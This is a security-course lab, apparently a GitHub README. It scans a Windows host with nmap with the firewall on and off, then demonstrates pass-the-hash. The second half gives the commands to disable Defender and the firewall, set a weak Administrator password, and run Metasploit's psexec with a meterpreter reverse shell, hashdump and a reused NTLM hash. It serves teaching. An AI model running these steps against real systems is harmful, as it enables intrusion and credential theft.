![image](/FilesForLabs/images/blueantisyphon.png)

---

This is a lab from **John Strand**'s **Information Security Core Skills** Course:

https://www.antisyphontraining.com/product/information-security-core-skills-tm/

---

# Host Firewalls and Nmap
### Lab Objective
In this lab we will be scanning your **Windows** system from your **Linux** terminal with the firewall both on and off. 

The goal is to show you how a system is very different to the network with a firewall enabled. 

Remember, treat your internal network as hostile, because it is.
<hr>

## Step 1: Enable Windows Firewall
Let's get started by opening a command prompt terminal. You can do this by clicking the icon in the taskbar.

<img width="74" height="91" alt="Screenshot From 2026-02-07 17-59-56" src="https://github.com/user-attachments/assets/19ade57f-f3a3-4d2e-ad65-13251ee1cc35" />

<br>

Once the command prompt window opens, we need to get the IP address of your **Windows** system by running the following:

```cmd
ipconfig
```
<img width="457" height="214" alt="img01" src="https://github.com/user-attachments/assets/0417df7d-3b84-4823-8214-5385063cdca8" />

<br>
Please note the IP for **your** system. Mine is **"10.10.75.191"**. 

>[!Note]
>
>**Yours will be different.**

Now, let’s enable the Windows firewall:

```bash
netsh advfirewall set allprofiles state on
```

<img width="452" height="35" alt="img02" src="https://github.com/user-attachments/assets/87a58a06-caaf-412f-8c83-152f2a9b729d" />
<hr>

## Step 2: Scanning Your Windows System
Let’s try and scan your Windows system from within a **Linux** terminal. 

Go ahead and open up an **Ubuntu Shell** by double-clicking the icon on the desktop:

<img width="90" height="104" alt="Screenshot From 2026-02-23 10-28-37" src="https://github.com/user-attachments/assets/196f7867-877b-4a37-bc02-1214e50e96a5" />

In the **Linux** terminal, let’s become root:

```bash
sudo su -
```

Now, let’s re-scan from the terminal:

```bash
nmap 10.10.75.191
```

>[!IMPORTANT]
>
>Your IP will be different!!!!

>[!TIP]
>
>You can just hit the up arrow key to view previously run commands.  

You can hit the spacebar to see status.

Once complete, your output should look like this:

<img width="461" height="329" alt="nmap_fw_on" src="https://github.com/user-attachments/assets/fe0eecfc-1fb7-4db6-a506-7a63466aee34" />

Please note the open ports. These are ports and services that an attacker could use to authenticate to your system or attack if an exploit is available. 

Now, using the same process as before, let’s disable the **Windows** firewall to go back to the base state:

```cmd
netsh advfirewall set allprofiles state off
```

<img width="462" height="346" alt="nmap_fw_off" src="https://github.com/user-attachments/assets/57c7c36d-cf84-4740-bdea-2fadf2be3eac" />

As we can see, there is one more service shown open on port **5357** and also, the other **985** ports are shown as directly as **closed**, not **filtered**

---

Now, lets see why this is important with pass the hash.

First lets configure the Windows system

Let's disable AV.

- Open **Powershell**

<img width="74" height="91" alt="Screenshot From 2026-02-07 17-59-15" src="https://github.com/user-attachments/assets/4bb73f73-82e2-419d-8f70-4f57c21cb3bf" />

```ps
Set-MpPreference -DisableRealtimeMonitoring $true
```

>[!NOTE]
>
>You can verify that it is disabled with the following command:
>
>```Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled```
>
>The output must be `False`.

Next, let's make sure that firewall is off:

```ps
netsh advfirewall set allprofiles state off
```

Now, let's set an easy password.  

```ps
net user Administrator password1234
```

It should look like this:

<img width="718" height="130" alt="2026-02-23_13-31" src="https://github.com/user-attachments/assets/0e82b469-9b03-43f6-a16d-9fab7c1ac38d" />

Now get your **Windows IP**:

```ps
ipconfig
```

<img width="457" height="214" alt="img01" src="https://github.com/user-attachments/assets/25a9d909-663b-46d2-8c7d-13c88fef36db" />

Now, let's open a **Linux** terminal by **Double-clicking** the `Ubuntu Shell` icon on the Desktop:

<img width="90" height="104" alt="Screenshot From 2026-02-23 10-28-37" src="https://github.com/user-attachments/assets/196f7867-877b-4a37-bc02-1214e50e96a5" />

Start of by becoming root:

```bash
sudo su -
```

Then, start Metasploit:

```bash
msfconsole -q
```

<img width="430" height="65" alt="msf_console" src="https://github.com/user-attachments/assets/b432d8c4-b773-480e-8993-892636243e1b" />

Open another **Ubuntu shell** to get your IP address:

```bash
ifconfig
```

<img width="513" height="119" alt="linux_ip" src="https://github.com/user-attachments/assets/2fdce39e-bbb2-4592-9d30-cd221241476f" />

<pre>use exploit/windows/smb/psexec</pre>

<pre>set RHOST <Your Windows IP></pre>

<pre>set LHOST <Your Linux IP></pre>

<pre>set SMBUSER Administrator</pre>

<pre>set SMBPASS password1234</pre>

<pre>set payload windows/x64/meterpreter/reverse_tcp</pre>

<pre>set target 2</pre>

<pre>exploit</pre>

It should look like this:
<img width="713" height="401" alt="meterpreter_shell_1" src="https://github.com/user-attachments/assets/acecbedb-41e7-44d8-a981-bf93ce408f03" />

Now dump the password hashes:

<pre>hashdump</pre>

<img width="617" height="86" alt="hashdump" src="https://github.com/user-attachments/assets/5b56ec37-fa6d-4172-9347-51d703ccd8f3" />

<pre>exit -y</pre>

<pre>set SMBPASS aad3b435b51404eeaad3b435b51404ee:d4a1be1776ad10df103812b1a923cde4</pre>

<pre>exploit</pre>

<img width="769" height="373" alt="meterpreter_shell_2" src="https://github.com/user-attachments/assets/a0e79b48-f167-4ac6-bfc1-7c5c5cfefaf8" />

Now kill it by running the following:

<pre>exit -y</pre>
